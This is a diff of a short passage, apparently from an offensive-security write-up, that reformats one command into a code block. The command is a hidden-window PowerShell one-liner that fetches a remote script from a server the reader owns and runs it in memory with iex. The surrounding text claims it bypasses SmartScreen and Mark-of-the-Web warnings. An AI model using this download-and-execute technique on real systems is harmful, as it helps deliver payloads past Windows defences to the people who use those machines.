@@ -91,7 +91,9 @@ You can see we're crossing the wire via 80 and 443, confirmed!
 
 Next, upload that somewhere and download and execute in memory using powershell:
 
-**powershell -w h -c "iwr 'https://some_server_you_own/webdav_runner.ps1' -UseBasicParsing | iex"**
+```ps1
+powershell -w h -c "iwr 'https://some_server_you_own/webdav_runner.ps1' -UseBasicParsing | iex"
+```
 
 That will execute within the Powershell terminal environment and bypass SmartScreen, MOTW, and that "OTHER" alert! 😺
 
